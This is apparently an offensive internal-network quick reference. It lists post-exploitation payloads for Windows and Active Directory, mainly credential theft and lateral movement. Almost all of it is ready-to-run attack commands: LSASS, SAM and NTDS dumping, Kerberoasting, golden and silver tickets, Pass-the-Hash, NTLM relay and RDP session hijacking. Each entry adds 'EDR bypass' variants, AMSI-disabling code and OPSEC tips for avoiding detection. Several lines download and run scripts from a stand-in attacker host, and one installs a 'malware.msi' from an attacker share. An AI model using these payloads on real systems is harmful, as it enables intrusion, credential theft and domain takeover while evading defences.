# Internal-network / post-exploitation quick reference

_128 structured payloads covering credential theft / lateral movement / privilege escalation / AV evasion / domain compromise / tunneling and proxying / information gathering / persistence_

## Category index

| Category | Count |
|---|--:|
| Credential theft | 20 |
| Lateral movement | 16 |
| Privilege escalation | 15 |
| AV evasion | 14 |
| Domain compromise | 14 |
| Tunneling and proxying | 13 |
| Information gathering | 12 |
| Persistence | 12 |
| Exchange attacks | 5 |
| ADCS attacks | 5 |
| SharePoint attacks | 2 |

## Credential theft

### Mimikatz credential dumping  `mimikatz-creds`
Use Mimikatz to dump Windows system credentials
Subcategory: **Mimikatz** · tags: `mimikatz` `credentials` `windows` `lsass`

**Preconditions:** administrator privileges; must bypass antivirus; Windows system

**Attack chain:**

**1. Dump all credentials**  _[windows]_
_Dump every logon credential from LSASS_
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**2. Dump LSASS**  _[windows]_
_Extract credentials from an LSASS dump file_
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

**3. Pass-the-Hash**  _[windows]_
_Perform a Pass-the-Hash attack with an NTLM hash_
```
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"
```

**4. DCSync attack**  _[windows]_
_Impersonate DC replication to obtain every domain user hash_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"
```

**5. Dump all hashes**  _[windows]_
_Dump all user hashes from LSA_
```
mimikatz.exe "lsadump::lsa /inject" "exit"
```

**6. Golden ticket**  _[windows]_
_Forge a golden ticket to gain Domain Admin privileges_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"
```

**7. Silver ticket**  _[windows]_
_Forge a silver ticket to access a specific service_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"
```

**EDR bypass variants:**

**1. PowerShell loading**
_Load Mimikatz remotely via PowerShell_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
```

**2. AMSI bypass**
_Disable AMSI, then load Mimikatz_
```
SET-ITEM -PATH "HKLM:\SOFTWARE\Microsoft\AMSI" -NAME "AllowBlocking" -VALUE 1; IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")
```

**3. Obfuscated execution**
_Bypass AMSI via reflection_
```
$a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
```

**Analysis:** on success you obtain credential material such as cleartext passwords, NTLM hashes and Kerberos tickets.

**OPSEC:** Mimikatz is detected by most antivirus; use obfuscation or in-memory loading to evade detection; prefer stealthier tools where possible; touching LSASS triggers EDR alerts

---

### Kerberoasting attack  `kerberoasting`
Kerberoasting attack to obtain service account hashes
Subcategory: **Kerberos** · tags: `kerberoasting` `kerberos` `active-directory` `spn`

**Preconditions:** a domain environment; any domain user credential; SPN accounts exist in the domain

**Attack chain:**

**1. Discover SPNs**  _[windows]_
_Query every SPN in the domain_
```
setspn -T domain.com -Q */*
```

**2. Request service tickets**  _[windows]_
_Request Kerberos tickets via PowerShell_
```
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"
```

**3. Export tickets**  _[windows]_
_Export Kerberos tickets with Mimikatz_
```
mimikatz.exe "kerberos::list /export" "exit"
```

**4. Rubeus request**  _[windows]_
_Perform Kerberoasting with Rubeus_
```
Rubeus.exe kerberoast /stats
```

**5. Impacket GetUserSPNs**  _[linux]_
_Obtain service tickets with Impacket_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request
```

**6. Offline cracking**  _[linux]_
_Crack Kerberos tickets with Hashcat_
```
hashcat -m 13100 kerberoast.hash wordlist.txt
```

**EDR bypass variants:**

**1. RC4 encryption**
_Use RC4 encryption to avoid raising alerts_
```
Rubeus.exe kerberoast /rc4opsec
```

**Analysis:** Kerberoasting yields service accounts' Kerberos tickets, which crack offline into cleartext passwords.

**OPSEC:** Kerberoasting needs no elevated privileges, only any domain user credential; prefer RC4 encryption to avoid detection

---

### AS-REP Roasting  `asreproasting`
AS-REP Roasting attack to obtain user hashes
Subcategory: **Kerberos** · tags: `asreproasting` `kerberos` `active-directory`

**Preconditions:** a domain environment; users with pre-authentication disabled exist in the domain

**Attack chain:**

**1. Rubeus attack**  _[windows]_
_Perform AS-REP Roasting with Rubeus_
```
Rubeus.exe asreproast
```

**2. Impacket attack**  _[linux]_
_Obtain AS-REP responses with Impacket_
```
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

**3. Find users with pre-auth disabled**  _[windows]_
_Find users that have pre-authentication disabled_
```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**4. Crack the hashes**  _[linux]_
_Crack AS-REP hashes with Hashcat_
```
hashcat -m 18200 asrep.hash wordlist.txt
```

**Analysis:** AS-REP Roasting yields the hashes of pre-auth-disabled users, which crack offline into cleartext passwords.

**OPSEC:** no credentials required, only a username; disabled pre-authentication is a misconfiguration

---

### LaZagne credential dumping  `lazagne-creds`
Use LaZagne to dump credentials from a variety of applications
Subcategory: **Tool** · tags: `lazagne` `credentials` `browsers` `applications`

**Preconditions:** access to the target machine; the LaZagne tool

**Attack chain:**

**1. Dump all credentials**  _[windows]_
_Dump every supported credential type_
```
laZagne.exe all
```

**2. Browser credentials**  _[windows]_
_Dump passwords saved in the browser_
```
laZagne.exe browsers
```

**3. WiFi credentials**  _[windows]_
_Dump WiFi passwords_
```
laZagne.exe wifi
```

**4. Mail clients**  _[windows]_
_Dump mail client passwords_
```
laZagne.exe mails
```

**5. Database credentials**  _[windows]_
_Dump database client passwords_
```
laZagne.exe databases
```

**6. Linux version**  _[linux]_
_Dump using the Linux build_
```
python laZagne.py all
```

**EDR bypass variants:**

**1. Obfuscated execution**
_Execute via Base64 encoding_
```
python -c "exec(__import__(\"base64\").b64decode(\"BASE64_PAYLOAD\"))"
```

**Analysis:** LaZagne extracts saved credentials from many applications, including browsers, mail clients and database clients.

**OPSEC:** LaZagne is detected by antivirus; consider obfuscation or in-memory loading; you can run only specific modules

---

### SAM database dump  `sam-dump`
Dump the Windows SAM database to obtain local account hashes
Subcategory: **SAM** · tags: `sam` `hash` `windows` `local`

**Preconditions:** administrator privileges; Windows system

**Attack chain:**

**1. reg export**  _[windows]_
_Export the SAM and SYSTEM registry hives_
```
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
```

**2. Impacket parsing**  _[linux]_
_Parse the SAM with Impacket_
```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**3. Mimikatz dump**  _[windows]_
_Dump the SAM with Mimikatz_
```
mimikatz.exe "lsadump::sam" "exit"
```

**4. Volume Shadow Copy**  _[windows]_
_Copy the SAM from a volume shadow copy_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.hive
```

**Analysis:** the SAM database holds local accounts' NTLM hashes, usable for cracking or Pass-the-Hash.

**OPSEC:** administrator privileges required; touching the registry may raise alerts; the volume shadow copy method is stealthier

---

### NTDS.dit dump  `ntds-dump`
Dump the Active Directory database to obtain every domain user hash
Subcategory: **NTDS** · tags: `ntds` `active-directory` `hash` `domain`

**Preconditions:** Domain Admin privileges; access to a domain controller

**Attack chain:**

**1. ntdsutil snapshot**  _[windows]_
_Create an IFM snapshot with ntdsutil_
```
ntdsutil "activate instance ntds" "ifm" "create full c:\temp" "quit" "quit"
```

**2. Volume Shadow Copy**  _[windows]_
_Copy NTDS.dit from a volume shadow copy_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
```

**3. Impacket parsing**  _[linux]_
_Parse NTDS.dit with Impacket_
```
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**4. Impacket remote dump**  _[linux]_
_Dump domain hashes remotely_
```
secretsdump.py domain/admin:password@dc_ip -just-dc
```

**5. Mimikatz DCSync**  _[windows]_
_Replicate all hashes via DCSync_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"
```

**Analysis:** NTDS.dit holds every domain user's hash, usable for cracking or Pass-the-Hash.

**OPSEC:** Domain Admin privileges required; the DCSync method is stealthier; the operation may trigger many alerts

---

### GPP password extraction  `gpp-password`
Extract passwords stored in Group Policy Preferences
Subcategory: **GPP** · tags: `gpp` `group-policy` `password` `xml`

**Preconditions:** a domain environment; any domain user credential

**Attack chain:**

**1. Find GPP files**  _[linux]_
_Search SYSVOL for XML files_
```
find /domain/sysvol -name "*.xml" 2>/dev/null
```

**2. PowerShell search**  _[windows]_
_Find GPP files via PowerShell_
```
Get-ChildItem -Path "\\domain.com\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\.xml$"}
```

**3. PowerView extraction**  _[windows]_
_Extract GPP passwords with PowerView_
```
Get-NetGPPPassword
```

**4. gpp-decrypt**  _[linux]_
_Decrypt the GPP password hash_
```
gpp-decrypt HASH
```

**5. Impacket extraction**  _[linux]_
_Extract GPP passwords with Impacket_
```
Get-GPPPassword.py domain/user:password@dc_ip
```

**Analysis:** GPP passwords are encrypted with a publicly known key and can be decrypted to cleartext.

**OPSEC:** GPP passwords are a common information-disclosure point; only ordinary domain user privileges are needed; after the MS14-025 fix new passwords are no longer stored

---

### Advanced Mimikatz techniques  `mimikatz-advanced`
Advanced Mimikatz credential extraction and abuse techniques
Subcategory: **Mimikatz** · tags: `mimikatz` `credentials` `advanced`

**Preconditions:** administrator privileges; the Mimikatz tool

**Attack chain:**

**1. DCSync attack**  _[windows]_
_Impersonate DC replication to obtain the Domain Admin hash_
```
lsadump::dcsync /domain:domain.com /user:Administrator
```

**2. Golden ticket generation**  _[windows]_
_Forge a golden ticket and inject it_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
```

**3. Silver ticket generation**  _[windows]_
_Forge a silver ticket to access a specific service_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
```

**4. Skeleton Key implant**  _[windows]_
_Implant a skeleton key with mimikatz_
```
privilege::debug
misc::skeleton
```

---

### Browser credential extraction  `browser-creds`
Extract saved passwords and cookies from browsers
Subcategory: **Browser** · tags: `browser` `credentials` `chrome` `firefox`

**Preconditions:** user-level privileges; the browser has saved passwords

**Attack chain:**

**1. Chrome password extraction**  _[windows]_
_Copy Chrome's Login Data database_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" | Copy-Item -Destination "C:\temp\Login Data"
```

**2. Chrome cookie extraction**  _[windows]_
_Copy Chrome's cookie database_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" | Copy-Item -Destination "C:\temp\Cookies"
```

**3. Using SharpWeb**  _[windows]_
_Extract browser credentials with SharpWeb_
```
SharpWeb.exe --browser chrome
```

**4. Using HackBrowserData**
_Extract all Chrome data_
```
hack-browser-data.exe -b chrome
```

---

### DPAPI credential extraction  `dpapi-creds`
Extract credentials from DPAPI-protected storage
Subcategory: **DPAPI** · tags: `dpapi` `credentials` `windows`

**Preconditions:** user-level privileges; the DPAPI master key

**Attack chain:**

**1. Enumerate DPAPI credentials**  _[windows]_
_Find DPAPI-protected credential files_
```
Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -Force
```

**2. Decrypt with Mimikatz**  _[windows]_
_Decrypt DPAPI credentials_
```
dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\XXX
```

**3. Obtain the master key**  _[windows]_
_Recover the DPAPI master key from memory_
```
sekurlsa::dpapi
```

---

### RDP credential extraction  `rdp-creds`
Extract saved RDP connection passwords
Subcategory: **RDP** · tags: `rdp` `credentials` `windows`

**Preconditions:** user-level privileges; saved RDP passwords

**Attack chain:**

**1. Find RDP files**  _[windows]_
_Find RDP connection files_
```
Get-ChildItem -Path "$env:USERPROFILE\Documents\*.rdp" -Recurse
```

**2. Extract RDP passwords**  _[windows]_
_List saved credentials_
```
cmdkey /list
```

**3. Using Mimikatz**  _[windows]_
_Decrypt the saved RDP password_
```
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\XXX
```

---

### WiFi credential extraction  `wifi-creds`
Extract saved WiFi passwords
Subcategory: **WiFi** · tags: `wifi` `credentials` `windows`

**Preconditions:** administrator privileges; a connected WiFi network

**Attack chain:**

**1. List WiFi profiles**  _[windows]_
_Show every WiFi profile_
```
netsh wlan show profiles
```

**2. Extract WiFi passwords**  _[windows]_
_Show WiFi passwords_
```
netsh wlan show profile name="WiFi_Name" key=clear
```

---

### Windows Vault credentials  `vault-creds`
Extract credentials from the Windows Credential Manager
Subcategory: **Vault** · tags: `vault` `credentials` `windows`

**Preconditions:** user-level privileges; saved credentials

**Attack chain:**

**1. List Vault credentials**  _[windows]_
_List every Vault_
```
vaultcmd /list
```

**2. Export Vault credentials**  _[windows]_
_List Windows credentials_
```
vaultcmd /listcreds:"Windows Credentials" /all
```

**3. Using Mimikatz**  _[windows]_
_Extract Credential Manager passwords from memory_
```
sekurlsa::credman
```

---

### KeePass credential extraction  `keepass-dump`
Extract passwords from a KeePass database
Subcategory: **KeePass** · tags: `keepass` `credentials` `password-manager`

**Preconditions:** the KeePass database file; the master password or a memory dump

**Attack chain:**

**1. Find the KeePass database**  _[windows]_
_Search for KeePass database files_
```
Get-ChildItem -Path C:\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue
```

**2. Recover the master password from memory**  _[windows]_
_Extract from the KeePass process memory_
```
Recover the master password from memory using KeePassDump or KeeThief
```

**3. Using KeeThief**  _[windows]_
_Extract KeePass passwords via PowerShell_
```
powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/KeeThief.ps1'); Get-KeePassPw
```

---

### LSA Secrets extraction  `lsa-secrets`
Extract sensitive data from LSA Secrets
Subcategory: **LSA** · tags: `lsa` `secrets` `windows`

**Preconditions:** SYSTEM privileges

**Attack chain:**

**1. Using Mimikatz**  _[windows]_
_Extract LSA Secrets_
```
lsadump::secrets
```

**2. Using reg save**  _[windows]_
_Export the registry hive for offline analysis_
```
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive
```

**3. Using Impacket**  _[linux]_
_Extract LSA Secrets offline_
```
secretsdump.py -security security.hive -system system.hive LOCAL
```

---

### Cached credential extraction  `cached-creds`
Extract cached domain credentials
Subcategory: **Cached** · tags: `cached` `credentials` `domain`

**Preconditions:** SYSTEM privileges; a domain environment

**Attack chain:**

**1. Using Mimikatz**  _[windows]_
_Extract cached domain credentials_
```
lsadump::cache
```

**2. Using reg save**  _[windows]_
_Export the SECURITY hive_
```
reg save HKLM\SECURITY security.hive
```

**3. Offline cracking**  _[linux]_
_Cached credentials can be cracked offline_
```
Crack cached domain credentials with hashcat
```

---

### DCSync attack  `dcsync-attack`
Impersonate domain controller replication to obtain credentials
Subcategory: **Domain compromise** · tags: `dcsync` `domain-controller` `mimikatz`

**Preconditions:** Domain Admin privileges, or specific replication rights

**Attack chain:**

**1. Using Mimikatz**  _[windows]_
_Run DCSync with Mimikatz_
```
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
```

**2. Using impacket**  _[linux]_
_Run DCSync with impacket_
```
python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip
```

**3. Dump all hashes**  _[windows]_
_Dump every domain user hash_
```
mimikatz # lsadump::dcsync /domain:domain.com /all /csv
```

**4. Privilege requirements**
_Rights required for DCSync_
```
One of the following rights is required:
- Domain Admin
- Enterprise Admin
- Replicating Directory Changes rights
```

---

### Golden ticket attack  `golden-ticket`
Forge a golden ticket using the krbtgt hash
Subcategory: **Domain persistence** · tags: `golden-ticket` `krbtgt` `kerberos`

**Preconditions:** the krbtgt account hash; the domain SID

**Attack chain:**

**1. Obtain the krbtgt hash**  _[windows]_
_Obtain the krbtgt account hash_
```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

**2. Obtain the domain SID**  _[windows]_
_Obtain the domain SID_
```
whoami /user
Or: wmic useraccount get sid
```

**3. Forge the golden ticket**  _[windows]_
_Forge and inject the golden ticket_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

**4. Verify the ticket**  _[windows]_
_Verify that the golden ticket is valid_
```
klist
Or: dir \\dc.domain.com\c$
```

---

### Silver ticket attack  `silver-ticket`
Forge a silver ticket using a service account hash
Subcategory: **Domain persistence** · tags: `silver-ticket` `kerberos` `service`

**Preconditions:** a service account hash; the domain SID

**Attack chain:**

**1. Obtain the service hash**  _[windows]_
_Obtain the service account hash_
```
mimikatz # sekurlsa::logonpasswords
Locate the service account's NTLM hash
```

**2. Forge the silver ticket**  _[windows]_
_Forge a ticket for a specific service_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt
```

**3. Common service types**
_Service types that can be forged_
```
CIFS - file sharing
HTTP - web services
LDAP - directory services
MSSQLSvc - SQL services
HOST - remote management
```

---

### Unattended-install credential extraction  `unattended-creds`
Extract cleartext or Base64-encoded administrator credentials from Windows unattended-install files (Unattend.xml / Sysprep)
Subcategory: **File credentials** · tags: `credentials` `unattend` `sysprep` `privilege-escalation` `windows`

**Preconditions:** read access to the local filesystem; the target has used unattended deployment

**Attack chain:**

**1. Search for unattended-install files**  _[windows]_
_Search the default paths for Unattend/Sysprep files, which may linger on the system after automated Windows deployment_
```
dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattended.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\sysprep.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul
```

**2. Search the whole disk for Unattend files**  _[windows]_
_When the default paths turn up nothing, recursively search the whole disk for any possible unattended files_
```
# CMD approach
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# PowerShell approach
Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName
```

**3. Extract cleartext passwords**  _[windows]_
_Extract the password fields from Unattend.xml; passwords may be stored as cleartext or Base64 in the <Password>/<AdminPassword>/<AutoLogon> nodes_
```
# View the file contents
type C:\Windows\Panther\Unattend.xml

# Search for the key fields
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell extraction
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }
```

**4. Decode Base64 passwords**  _[windows]_
_If the Unattend.xml password is stored as Base64 it must be decoded. Windows uses UTF-16LE, so decode as Unicode rather than ASCII_
```
# Decode Base64 in PowerShell
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # the encoded value extracted from the XML
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# Or use certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt
```

**5. Check other sensitive install files**  _[windows]_
_Beyond Unattend.xml, other locations may also hold cleartext credentials_
```
# Check GPP (Group Policy Preferences) passwords
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul

# Check IIS configuration files
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"

# Check VNC password files
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# Check WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="target-WiFi" key=clear
```

**6. Automate with Metasploit**  _[windows]_
_Use Metasploit post-exploitation modules to automatically find and extract credentials from unattended-install files_
```
# Metasploit module
use post/windows/gather/enum_unattend
set SESSION 1
run

# You can also use
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump
```

**EDR bypass variants:**

**1. Bypass file-access monitoring**  _[windows]_
_Bypass file-access monitoring via volume shadow copies or streamed reads_
```
# Use a Volume Shadow Copy to read locked files
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Panther\Unattend.xml C:\temp\u.xml

# Use streamed PowerShell reads to avoid file locks
[IO.File]::ReadAllText("C:\Windows\Panther\Unattend.xml")
```

**Analysis:** unattended-install files are a byproduct of large-scale Windows deployment. The <UserAccounts>/<AutoLogon> nodes in these XML files may hold cleartext or encoded credentials for a local or domain administrator. The issue is extremely common in enterprise environments because IT often forgets to clean these files up after deployment.

**OPSEC:** reading files rarely raises alerts, but bulk file searches (dir /s) may be caught by EDR. Prefer checking known paths directly over a whole-disk search.

---

## Lateral movement

### PsExec lateral movement  `lateral-psexec`
Use PsExec for lateral movement
Subcategory: **SMB** · tags: `psexec` `lateral` `smb` `windows`

**Preconditions:** the target has port 445 open; you hold administrator credentials for it; the ADMIN$ share is reachable

**Attack chain:**

**1. Basic usage**  _[linux]_
_Connect to the target with Impacket's psexec.py_
```
psexec.py domain/user:password@target_ip
```

**2. Connect with a hash**  _[linux]_
_Pass-the-Hash with an NTLM hash_
```
psexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**3. Run a command**  _[linux]_
_Run a command on the target machine_
```
psexec.py domain/user:password@target_ip "whoami"
```

**4. Windows PsExec**  _[windows]_
_Use Sysinternals PsExec_
```
PsExec.exe \\target_ip -u domain\user -p password cmd.exe
```

**EDR bypass variants:**

**1. Custom service name**
_Use a custom service name to avoid detection_
```
psexec.py -service-name CustomService domain/user:password@target_ip
```

**2. SMBExec alternative**
_Use smbexec.py, which writes nothing to disk_
```
smbexec.py domain/user:password@target_ip
```

**Analysis:** PsExec creates a service on the target over SMB and runs a command; on success you get a shell on the target.

**OPSEC:** PsExec creates a service on the target and is easily detected; the service name and binary may trigger alerts; consider stealthier lateral-movement methods

---

### WMI lateral movement  `lateral-wmi`
Use WMI for lateral movement
Subcategory: **WMI** · tags: `wmi` `lateral` `windows` `remote`

**Preconditions:** the target has port 135 open; you hold administrator credentials for it; the WMI service is reachable

**Attack chain:**

**1. Run a command via WMI**  _[windows]_
_Run a command remotely with WMIC_
```
wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
```

**2. Impacket wmiexec**  _[linux]_
_Use Impacket's wmiexec.py_
```
wmiexec.py domain/user:password@target_ip
```

**3. Using a hash**  _[linux]_
_Pass-the-Hash over WMI_
```
wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**4. PowerShell WMI**  _[windows]_
_Use PowerShell WMI_
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
```

**EDR bypass variants:**

**1. WMI event subscription**
_Execute code by installing an MSI package via WMI_
```
wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
```

**Analysis:** WMI lateral movement creates no service on the target, making it stealthier than PsExec.

**OPSEC:** WMI execution leaves no obvious file artifacts, but WMI activity may be monitored; command output is retrieved through a temporary file

---

### Pass-the-Hash attack  `pass-the-hash`
Authenticate using an NTLM hash
Subcategory: **Authentication attacks** · tags: `pth` `ntlm` `hash` `authentication`

**Preconditions:** you have the user's NTLM hash; the target allows NTLM authentication; the target has SMB/WMI ports open

**Attack chain:**

**1. Impacket PtH**  _[linux]_
_Perform PtH with Impacket_
```
psexec.py -hashes :NTHASH domain/user@target_ip
```

**2. CrackMapExec PtH**  _[linux]_
_Perform PtH with CrackMapExec_
```
crackmapexec smb target_ip -u user -H NTHASH -d domain
```

**3. Windows PtH**  _[windows]_
_Perform PtH with Mimikatz_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
```

**4. PowerShell PtH**  _[windows]_
_Perform PtH with PowerShell_
```
Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
```

**EDR bypass variants:**

**1. Overpass-the-Hash**
_Convert the hash into a Kerberos ticket_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
```

**Analysis:** on success, PtH lets you access the target as that user with no cleartext password.

**OPSEC:** PtH produces no password-validation entry in the logon logs, but it does leave network logon logs; watch the timestamps and source IP

---

### NTLM relay attack  `ntlm-relay`
NTLM relay attack techniques
Subcategory: **Authentication attacks** · tags: `ntlm` `relay` `smb` `authentication`

**Preconditions:** the target has SMB ports open; SMB signing is not enforced on it; you can coerce it into authenticating

**Attack chain:**

**1. Responder listener**  _[linux]_
_Start Responder to capture NTLM authentication_
```
responder -I eth0 -wrf
```

**2. ntlmrelayx attack**  _[linux]_
_Run a relay attack with ntlmrelayx_
```
ntlmrelayx.py -tf targets.txt -smb2support
```

**3. Relay to LDAP**  _[linux]_
_Relay to LDAP for privilege escalation_
```
ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
```

**4. IPv6 relay**  _[linux]_
_Perform an NTLM relay over IPv6_
```
mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
```

**EDR bypass variants:**

**1. Drop the MIC**
_Strip the MIC flag to bypass signature verification_
```
ntlmrelayx.py -t smb://target --remove-mic
```

**Analysis:** a successful NTLM relay grants access to the target machine or escalates domain privileges.

**OPSEC:** the target must not enforce SMB signing; domain controllers enforce it by default; IPv6 relay is stealthier

---

### WinRM lateral movement  `lateral-winrm`
Move laterally via WinRM
Subcategory: **WinRM** · tags: `winrm` `lateral` `powershell`

**Preconditions:** WinRM enabled; valid credentials

**Attack chain:**

**1. PowerShell remoting**  _[windows]_
_PowerShell remote session_
```
Enter-PSSession -ComputerName target -Credential $cred
```

**2. Run a command**  _[windows]_
_Run a command remotely_
```
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
```

**3. evil-winrm**  _[linux]_
_Connect with evil-winrm_
```
evil-winrm -i target -u user -p password
```

---

### DCOM lateral movement  `lateral-dcom`
Move laterally via DCOM
Subcategory: **DCOM** · tags: `dcom` `lateral` `com`

**Preconditions:** DCOM enabled; valid credentials

**Attack chain:**

**1. MMC20.Application**  _[windows]_
_Run a command via MMC DCOM_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```

**2. ShellBrowserWindow**  _[windows]_
_Execute via ShellBrowserWindow_
```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
```

**3. Excel DCOM**  _[windows]_
_Execute via Excel DCOM_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```

---

### SSH lateral movement  `lateral-ssh`
Move laterally via SSH
Subcategory: **SSH** · tags: `ssh` `lateral` `linux`

**Preconditions:** an SSH service; valid credentials

**Attack chain:**

**1. SSH connection**  _[linux]_
_Basic SSH connection_
```
ssh user@target
```

**2. SSH key authentication**  _[linux]_
_Connect with a private key_
```
ssh -i private_key user@target
```

**3. SSH pivoting**  _[linux]_
_Connect through a jump host_
```
ssh -J jump_host user@target
```

---

### RDP session hijacking  `rdp-hijack`
Hijack an existing RDP session
Subcategory: **RDP** · tags: `rdp` `hijack` `session`

**Preconditions:** SYSTEM privileges; an existing RDP session

**Attack chain:**

**1. List sessions**  _[windows]_
_List every user session_
```
query user
```

**2. Hijack a session**  _[windows]_
_Hijack a specific session_
```
tscon SESSION_ID /dest:console
```

**3. Using Mimikatz**  _[windows]_
_Hijack with Mimikatz_
```
ts::sessions
ts::remote /id:SESSION_ID
```

---

### Overpass-the-Hash  `overpass-the-hash`
Obtain a Kerberos ticket using a hash
Subcategory: **PtH** · tags: `pth` `kerberos` `hash`

**Preconditions:** the user's NTLM hash; a domain environment

**Attack chain:**

**1. Mimikatz**  _[windows]_
_Obtain a Kerberos ticket using a hash_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
```

**2. Rubeus**  _[windows]_
_Obtain a ticket with Rubeus_
```
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
```

**3. Impacket**  _[linux]_
_Obtain a Kerberos ticket_
```
getTGT.py domain.com/user -hashes :HASH
```

---

### Pass-the-Ticket  `pass-the-ticket`
Move laterally using a Kerberos ticket
Subcategory: **PtT** · tags: `ptt` `kerberos` `ticket`

**Preconditions:** a valid Kerberos ticket

**Attack chain:**

**1. Export a ticket**  _[windows]_
_Export a Kerberos ticket from memory_
```
sekurlsa::tickets /export
```

**2. Inject a ticket**  _[windows]_
_Inject a ticket into the current session_
```
kerberos::ptt ticket.kirbi
```

**3. Rubeus import**  _[windows]_
_Inject a ticket with Rubeus_
```
Rubeus.exe ptt /ticket:base64ticket
```

---

